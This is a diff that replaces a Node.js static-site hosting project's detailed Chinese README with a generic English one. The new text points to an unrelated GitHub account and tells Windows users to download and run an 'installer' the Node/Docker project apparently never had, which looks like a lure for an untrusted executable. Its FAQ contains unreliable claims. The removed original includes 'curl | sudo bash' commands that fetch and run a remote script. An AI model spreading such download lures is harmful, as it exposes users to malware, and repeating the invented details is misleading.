@@ -1,394 +1,83 @@
-# Static Site Showcase
+# 📁 static-site-showcase - Host your static websites with ease
 
-[![测试状态](https://github.com/epiphany131/static-site-showcase/actions/workflows/test.yml/badge.svg)](https://github.com/epiphany131/static-site-showcase/actions/workflows/test.yml)
-[![Node.js](https://img.shields.io/badge/Node.js-%3E%3D22.13.0-339933?logo=node.js&logoColor=white)](https://nodejs.org/)
-[![Docker](https://img.shields.io/badge/Docker-支持-2496ED?logo=docker&logoColor=white)](DOCKER.md)
-[![许可证](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)
+[![Download Software](https://img.shields.io/badge/Download-Release-blue)](https://github.com/Fellowfeelingfamilyblenniidae970/static-site-showcase)
 
-一个可自行部署的静态网站作品展示与托管平台。支持上传 ZIP 项目或直接粘贴 HTML、CSS、JavaScript，一键生成可预览、可发布、可浏览源码和下载源码的静态网站。
+This tool helps you host your own static websites. It works on your computer and supports many features like ZIP file uploads and live previews. You can manage multiple users and secure your data with a database. It fits many uses, whether you have one site or many.
 
-平台基于 **Node.js 22、Express 和 SQLite** 构建，不依赖外部数据库服务，同时提供多用户权限、Markdown 内容页面、站点沙箱隔离、Docker Compose 与 Caddy HTTPS 部署方案。
+## 🛠 Features
 
-## 界面预览
+*   **Upload options:** Use ZIP files or paste your code directly.
+*   **User management:** Control who gets access to your projects.
+*   **Secure storage:** The app uses SQLite to keep your data safe.
+*   **Sandbox preview:** See how your site looks before you publish it.
+*   **Flexible hosting:** Run this with Docker and Caddy for professional performance.
 
-### 作品展示首页
+## 💻 System Requirements
 
-支持大卡片、网格和紧凑列表布局，并提供浅色、深色与跟随系统三种主题。
+*   **Operating System:** Windows 10 or 11.
+*   **Memory:** At least 4GB of RAM.
+*   **Disk Space:** 500MB of free space for the application and your sites.
+*   **Network:** An active internet connection for web access.
 
-![作品展示首页](docs/images/gallery.png)
+## 📥 Getting Started
 
-### 源码浏览与下载
+You do not need to be a developer to use this platform. Follow these steps to set up the software on your Windows computer.
 
-公开源码的作品可以在线浏览文件树、查看语法高亮代码、复制内容，并直接下载完整 ZIP。
+1.  Visit the [official download page](https://github.com/Fellowfeelingfamilyblenniidae970/static-site-showcase) to find the latest version of the application.
+2.  Look for the section marked Releases on the right side of the page.
+3.  Click the link for the Windows installer file.
+4.  Save the file to your computer.
+5.  Double-click the downloaded file to start the installation.
+6.  Follow the prompts in the setup window to finish the process.
 
-![源码浏览与下载](docs/images/source-browser.png)
+## 🚀 How to Run the Software
 
-### 静态网站独立预览
+Once the installation finishes, you can start the application.
 
-每个作品都拥有独立运行地址，上传的 HTML、CSS 和 JavaScript 会在 CSP 沙箱中实时运行。
+1.  Find the application icon on your desktop or in your start menu.
+2.  Double-click the icon to launch the program.
+3.  A small window will appear that shows the status of your server.
+4.  Open your web browser and type `http://localhost:3000` into the address bar.
+5.  The dashboard will load, and you can begin managing your websites.
 
-![静态网站独立预览](docs/images/live-preview.png)
+## 📦 Using Docker and Caddy
 
-### Markdown 内容页面
+If you want to move your websites to a web server, you can use Docker and Caddy. These tools automate the setup of secure connections.
 
-管理员可以创建带分类、目录、代码高亮和前后篇导航的文章、文档及代码教程。
+1.  Install Docker Desktop for Windows.
+2.  Download the configuration files from the project page.
+3.  Open your command prompt in the folder containing these files.
+4.  Type `docker-compose up -d` and press Enter.
+5.  Your sites will now run in the background.
 
-![Markdown 内容页面](docs/images/content-page.png)
+## 🔐 Managing User Permissions
 
-> 以上截图使用隔离演示数据生成，不包含真实账号、用户上传内容或生产环境数据。
+The platform includes a built-in menu to manage users. Administrators can grant access to folders or allow other people to add their own sites.
 
-## 功能亮点
+*   **Admin account:** This account can create other accounts and edit files.
+*   **Standard account:** This account can upload files and view existing projects.
 
-### 静态网站发布
+To change user roles, go to the Settings tab in your browser dashboard and select the User Management section. From here, you can add new emails and assign roles to each person.
 
-- 上传包含 `index.html` 的 ZIP 项目并自动解压部署。
-- 管理员可在后台设置 1–200 MiB 的 ZIP 单文件上传上限，上传页同步显示当前限制。
-- 选择 ZIP 后显示文件名与文件大小，上传过程中显示真实进度、百分比和已上传字节数。
-- 直接在后台粘贴 HTML、CSS、JavaScript 创建网站。
-- 新建作品默认保存为草稿，确认预览效果后再公开发布。
-- 可独立控制作品是否公开源代码。
-- 公开源码支持在线文件树浏览、语法高亮和 ZIP 下载。
-- 自动识别并展开只包含一个项目目录的 ZIP 包。
+## 🔧 Frequently Asked Questions
 
-### 内容与展示
+**Does the app work without an internet connection?**
+Yes. You can use the app to host sites locally on your machine even if you are offline.
 
-- 提供作品首页、作品详情页和独立内容页。
-- 支持创建多篇 Markdown 文章、文档和代码教程。
-- Markdown 编辑器提供实时预览、标题目录和代码高亮。
-- 支持站点名称、首页文案、主题、布局、Logo 和 Favicon 配置。
-- 作品卡片和详情页显示作者用户名。
+**Is it safe to store my code inside this app?**
+The app saves your files to a local database. Only people with access to your computer or your local network can see them.
 
-### 用户与权限
+**Can I host HTML, CSS, and JavaScript files?**
+Yes. You can upload any standard web files using the drag-and-drop tool on the dashboard.
 
-- **管理员**：管理所有作品、内容页面、用户和站点外观。
-- **编辑者**：创建并管理自己名下的作品。
-- 管理员和编辑者都可以在账号设置中修改自己的用户名和密码。
-- 使用 SQLite 会话、HttpOnly Cookie、登录 CSRF 挑战和写操作 CSRF Token。
+**How do I delete a site?**
+Go to the Dashboard, find the site you want to remove, and click the Delete button. The system will remove the files and clear the database entry.
 
-### 安全设计
+**What happens if I forget my password?**
+If you lose your password, check the configuration file in the application installation directory to reset your credentials.
 
-- ZIP 路径穿越、文件数量、单文件大小、解压总量和压缩比限制。
-- 粘贴代码上传采用严格的 multipart 字段、文件、部件和 UTF-8 校验。
-- 托管网站统一运行在不包含 `allow-same-origin` 的 CSP 沙箱中。
-- 公开源码自动过滤环境文件、私钥、数据库等敏感内容。
-- 登录不依赖固定 Host 白名单，可在本地地址和反向代理后正常使用。
-- 不启用带凭据的跨域访问（CORS）。
-- 新数据库首次启动时必须显式设置管理员密码，不提供公开默认密码。
+## 💬 Support
 
-## 界面入口
+If you run into trouble, check the Issues tab on the project page. You can read questions from other users or search for solutions to common problems. If you find a new bug, feel free to report it so the team can fix it.
 
-本地启动后可访问：
-
-| 页面 | 地址 |
-| --- | --- |
-| 作品首页 | <http://localhost:3000/> |
-| 内容页面 | <http://localhost:3000/pages> |
-| 登录页面 | <http://localhost:3000/login> |
-| 管理后台 | <http://localhost:3000/admin/> |
-| 健康检查 | <http://localhost:3000/health> |
-
-## 环境要求
-
-- Node.js 22.13.0 或更高版本
-- npm
-- Docker Engine 和 Docker Compose v2（使用容器部署时）
-- 可选：域名和可从公网访问的 80/443 端口（使用 Caddy 自动 HTTPS 时）
-
-## 快速开始
-
-### 使用 Node.js
-
-```bash
-git clone https://github.com/epiphany131/static-site-showcase.git
-cd static-site-showcase
-npm ci
-cp .env.example .env
-```
-
-编辑 `.env`，至少设置一个强管理员密码：
-
-```env
-ADMIN_USERNAME=admin
-ADMIN_PASSWORD=请替换为足够长的随机密码
-```
-
-启动服务：
-
-```bash
-npm start
-```
-
-首次启动会创建 SQLite 数据库和初始管理员。初始账号环境变量只在数据库尚无用户时生效；之后请在后台的 **账号设置** 中修改账号信息。
-
-### 一键 Docker 部署
-
-公开镜像：`docker.io/epiphany131/static-site-showcase:1.3.0`，支持 `linux/amd64` 和 `linux/arm64`。
-
-默认 HTTP 会监听所有地址 `0.0.0.0:3000`，部署完成后任何能访问该服务器端口的人都可以通过服务器 IP 直接打开：
-
-```bash
-curl -fsSL https://raw.githubusercontent.com/epiphany131/static-site-showcase/v1.3.0/deploy.sh \
-  | sudo bash -s -- install --mode http
-```
-
-如需只允许服务器本机访问，增加 `--local-http`：
-
-```bash
-curl -fsSL https://raw.githubusercontent.com/epiphany131/static-site-showcase/v1.3.0/deploy.sh \
-  | sudo bash -s -- install --mode http --local-http
-```
-
-域名 + Caddy 自动 HTTPS：
-
-```bash
-curl -fsSL https://raw.githubusercontent.com/epiphany131/static-site-showcase/v1.3.0/deploy.sh \
-  | sudo bash -s -- install --mode https \
-      --domain showcase.example.com \
-      --email admin@example.com
-```
-
-安装过程会依次询问部署模式、HTTP 端口、管理员用户名和管理员密码，直接回车即使用默认值：
-
-| 提示项 | 默认值 |
-| --- | --- |
-| 部署模式 | `http` |
-| HTTP 监听 | `0.0.0.0`（所有地址） |
-| HTTP 端口 | `3000` |
-| 管理员用户名 | `admin` |
-| 管理员密码 | `123456` |
-
-默认 HTTP 是明文传输，默认密码 `123456` 很容易被猜到。任何能访问该端口的人都可以尝试登录，请在安装时输入强密码或首次登录后立即通过 **账号设置** 修改；面向互联网时推荐 HTTPS。也可以使用 `--port`、`--admin-username`、`--admin-password` 直接指定，配合 `--yes` 可完全跳过提示。
-
-数据默认保存在 `/opt/static-site-showcase`。`--public-http` 作为兼容参数仍可明确选择公开监听，但现在不再是必需参数。
-
-安装和升级会下载同一 Git 标签下的 Compose、Caddy 和脚本文件，并使用 `deploy-assets.sha256` 逐项校验后才替换。修改操作使用互斥锁；升级前会创建一致性备份，失败时恢复旧部署文件、旧镜像标签并重新确认健康状态。需要在执行前审阅脚本时，请使用 [Docker 部署文档](DOCKER.md) 中的“下载、校验、再执行”流程。
-
-常用运维命令：
-
-```bash
-sudo /opt/static-site-showcase/deploy.sh status
-sudo /opt/static-site-showcase/deploy.sh logs
-sudo /opt/static-site-showcase/deploy.sh backup
-sudo /opt/static-site-showcase/deploy.sh upgrade --version 1.3.0
-```
-
-也可以克隆源码并执行 `docker compose up -d --build`。完整说明请查看 [Docker 部署文档](DOCKER.md)。
-
-## 使用方法
-
-### 上传 ZIP 网站
-
-1. 使用管理员或编辑者账号登录后台。
-2. 在部署面板中选择 **ZIP 上传**。
-3. 填写作品名称和介绍。
-4. 上传根目录包含 `index.html` 的 ZIP 文件。选择后页面会显示文件名、大小和当前上限，上传时显示真实进度。
-5. 创建完成后先预览作品，再根据需要设置源码可见性并发布。
-
-管理员可在 **全站设置** 中将最大 ZIP 单文件上传大小设为 1–200 MiB；设置保存后下一次上传立即生效，无需重启服务。编辑者可在上传页查看当前限制，但不能修改。
-
-上传过程还会限制：
-
-- ZIP 条目数量；
-- 单文件解压大小；
-- 解压后的总大小；
-- 异常压缩比；
-- 重复目标文件；
-- 绝对路径和目录穿越路径。
-
-### 粘贴代码创建网站
-
-在部署面板中切换到 **粘贴代码**，然后填写：
-
-- HTML：必填；
-- CSS：可选；
-- JavaScript：可选。
-
-服务端会生成：
-
-```text
-index.html
-style.css
-script.js
-```
-
-每个代码文件最大为 512 KiB。完整 HTML 文档会尽量保留原有结构，HTML 片段则会自动补充文档结构、UTF-8、移动端 viewport 和资源引用。
-
-### 创建 Markdown 内容页
-
-管理员可以在后台创建独立内容页面，用于发布：
-
-- 使用说明；
-- 技术文章；
-- 项目文档；
-- 代码教程；
-- 公告或其他富文本内容。
-
-内容页不会混入作品首页，只会显示在独立的内容列表中。
-
-## 配置说明
-
-复制 `.env.example` 后可配置以下变量：
-
-| 变量 | 默认值 | 用途 |
-| --- | --- | --- |
-| `PORT` | `3000` | Node.js HTTP 端口 |
-| `NODE_ENV` | `development` | 运行环境 |
-| `MAX_FILE_SIZE` | `52428800` | 新数据库或旧设置首次迁移时的 ZIP 上传上限初始值（字节）；之后由后台设置管理 |
-| `DB_PATH` | `./database/platform.db` | SQLite 数据库路径 |
-| `ADMIN_USERNAME` | `admin` | 初始管理员用户名 |
-| `ADMIN_PASSWORD` | 新数据库必填 | 初始管理员密码 |
-| `COOKIE_SECURE` | `false` | 为 `true` 时仅通过 HTTPS 发送 Cookie |
-| `TRUST_PROXY` | `0` | 设置为 `1` 时信任一层反向代理 |
-| `STATIC_HOST_IMAGE` | Docker Hub 官方镜像 | 高级覆盖；通常保持默认 |
-| `IMAGE_TAG` | `1.3.0` | Docker 镜像版本；生产环境建议固定 SemVer |
-| `HTTP_BIND` | `0.0.0.0` | Docker HTTP 宿主机监听地址；设为 `127.0.0.1` 可限制为本机 |
-| `HTTP_PORT` | `3000` | Docker HTTP 宿主机端口 |
-| `PLATFORM_ORIGIN` | 无 | Caddy HTTPS 域名，不包含协议或路径 |
-| `ACME_EMAIL` | 无 | Caddy ACME 联系邮箱 |
-
-> 修改 `ADMIN_USERNAME` 或 `ADMIN_PASSWORD` 不会覆盖已有数据库中的账号。已有用户应通过后台账号设置修改凭据。`MAX_FILE_SIZE` 也只用于初始化缺少上传配置的数据库；数据库已有 `uploads.maxFileSize` 后，修改环境变量不会覆盖后台保存的值。
-
-## HTTPS 生产部署
-
-一键脚本的 `--mode https` 会下载并校验固定版本的生产 Compose 与 Caddyfile，验证域名和邮箱，并在健康检查通过后尝试验证公网 HTTPS。域名 DNS 必须指向服务器，并开放 TCP 80/443 与 UDP 443；若服务器自身无法通过 DNS 或回环 NAT 访问公网地址，脚本会保留已健康运行的服务并提示检查网络，而不会因该外部探测回滚。
-
-生产配置会：
-
-- 强制要求管理员密码、域名和 ACME 邮箱；
-- 启用 `COOKIE_SECURE=true`；
-- 配置 `TRUST_PROXY=1`；
-- 等待 Node.js 健康检查通过后再启动 Caddy；
-- 只由 Caddy 对外发布 80/443；
-- 将 Caddy 证书状态保存在命名卷中。
-
-手动部署时，在 `.env` 设置 `IMAGE_TAG`、`ADMIN_PASSWORD`、`PLATFORM_ORIGIN` 和 `ACME_EMAIL`，然后执行：
-
-```bash
-docker compose -f docker-compose.production.yml pull
-docker compose -f docker-compose.production.yml up -d --no-build
-```
-
-完整的备份、升级、失败恢复和标签策略请查看 [Docker 部署文档](DOCKER.md)。
-
-## 网络与沙箱模型
-
-应用接受携带任意语法合法 `Host` 请求头的请求，以便在局域网地址、动态端口和不同反向代理后使用。这不等同于开放 CORS，也不等同于生产环境的域名访问控制。
-
-公开部署时应让反向代理只路由预期域名，并启用 HTTPS。
-
-所有托管站点文件都会收到以下安全响应头：
-
-```text
-Content-Security-Policy: sandbox allow-scripts allow-forms allow-modals allow-popups allow-downloads
-X-Content-Type-Options: nosniff
-```
-
-上传的网站可以在沙箱中执行 JavaScript，但不会获得平台同源权限。除非充分理解安全影响，否则不要添加 `allow-same-origin`。
-
-## 数据目录与备份
-
-运行时数据位于以下目录，这些目录不会被 Git 跟踪：
-
-```text
-database/   SQLite 数据库和品牌资源
-sites/      解压或生成的静态网站
-uploads/    临时上传和下载文件
-```
-
-建议使用 SQLite 的 `VACUUM INTO` 创建一致性数据库快照，然后分别备份：
-
-```text
-database/platform.db
-database/assets/
-sites/
-```
-
-如需完整运行快照，也可以包含 `uploads/`。备份后应保存 SHA-256 清单并定期测试恢复流程。
-
-> 日常更新不要运行 `docker compose down -v`，除非明确要删除 Caddy 命名卷。
-
-## 开发与测试
-
-```bash
-npm ci
-npm test
-npm run dev
-```
-
-GitHub Actions 会在以下环境中运行完整测试：
-
-- Node.js 22.13.0；
-- Node.js 24。
-
-测试覆盖：
-
-- 登录、会话和 CSRF；
-- 管理员与编辑者权限；
-- SQLite 初始化和旧数据迁移；
-- ZIP 创建、解压和安全限制；
-- 粘贴代码解析和失败回滚；
-- 托管源码过滤和下载；
-- Markdown 渲染和 XSS 防护；
-- 品牌图片类型校验；
-- 站点 CSP 沙箱响应头。
-
-## API 概览
-
-所有管理接口都要求登录；修改数据的管理接口还要求有效 CSRF Token。
-
-| 方法与路径 | 用途 |
-| --- | --- |
-| `POST /api/auth/login` | 登录并创建会话 |
-| `GET /api/auth/me` | 获取当前账号 |
-| `PATCH /api/auth/profile` | 修改当前用户名 |
-| `POST /api/auth/change-password` | 修改当前密码 |
-| `GET /api/sites` | 获取有权管理的作品 |
-| `GET /api/upload-config` | 获取当前账号可用的 ZIP 上传限制 |
-| `GET/PATCH /api/admin/settings` | 管理全站设置和 ZIP 上传上限（仅管理员） |
-| `POST /api/sites` | 上传 ZIP 网站 |
-| `POST /api/sites/code` | 通过粘贴代码创建网站 |
-| `PATCH /api/sites/:id` | 修改发布状态、源码可见性或元数据 |
-| `DELETE /api/sites/:id` | 删除作品及其文件 |
-| `GET /api/gallery` | 获取公开作品列表 |
-| `GET /api/gallery/:id/files` | 获取公开源码文件树 |
-| `GET /api/gallery/:id/download` | 下载公开源码 ZIP |
-| `GET /api/pages` | 获取已发布内容页面 |
-| `GET /health` | 服务健康检查 |
-
-## 项目结构
-
-```text
-app.js                         Express 应用和路由
-server.js                      服务启动入口
-database.js                    SQLite 结构、迁移和数据访问
-lib/                           认证、上传、ZIP、Markdown 等模块
-public/                        管理后台界面
-showcase/                      作品首页、详情页和内容页
-test/                          Node.js 测试套件
-test-site/                     示例静态网站夹具
-Dockerfile                     Node.js 运行镜像
-docker-compose.yml             本地 Docker 部署
-docker-compose.production.yml  Caddy HTTPS 生产部署
-```
-
-## 安全问题报告
-
-请不要通过公开 Issue 披露漏洞、利用代码、账号凭据或私有部署信息。
-
-请进入仓库的 **Security** 页面，使用 GitHub Private Vulnerability Reporting 私下提交报告。详细要求请参阅 [SECURITY.md](SECURITY.md)。
-
-## 参与贡献
-
-欢迎通过 Issue 报告问题或提出功能建议，也欢迎提交 Pull Request。提交前请确保：
-
-```bash
-npm ci
-npm test
-npm audit --omit=dev --audit-level=high
-```
-
-## 许可证
-
-本项目使用 [MIT License](LICENSE)。
-
-项目中内置的 PrismJS 浏览器资源及相关版权说明请查看 [THIRD_PARTY_NOTICES.md](THIRD_PARTY_NOTICES.md)。
+Keywords: caddy, docker, docker-compose, express, file-upload, javascript, nodejs, self-hosted, sqlite, static-hosting, static-site, website-showcase, zip
